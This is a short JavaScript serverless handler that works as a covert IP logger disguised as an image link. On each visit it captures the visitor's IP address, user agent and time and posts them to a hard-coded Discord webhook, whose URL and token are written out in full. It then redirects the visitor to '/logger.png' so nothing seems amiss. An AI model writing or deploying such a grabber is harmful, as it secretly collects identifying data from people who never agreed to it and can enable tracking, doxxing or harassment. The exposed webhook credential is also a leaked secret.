export default async function handler(req, res) {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();

  const message = {
    content: `📥 New hit:
**IP:** ${ip}
**User-Agent:** ${userAgent}
**Time:** ${timestamp}`
  };

  // Send to Discord webhook
  try {
    await fetch("https://discord.com/api/webhooks/1368632808272166993/gtg57o2-zSaOXGXd6zhwYhPxSMr2xJaCOq8BGIulVMDBjO7JD1ZWRCWsc2jROes6mSba", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(message),
    });
  } catch (err) {
    console.error("Failed to send webhook:", err);
  }

  // Redirect to actual image
  res.writeHead(302, { Location: '/logger.png' });
  res.end();
}
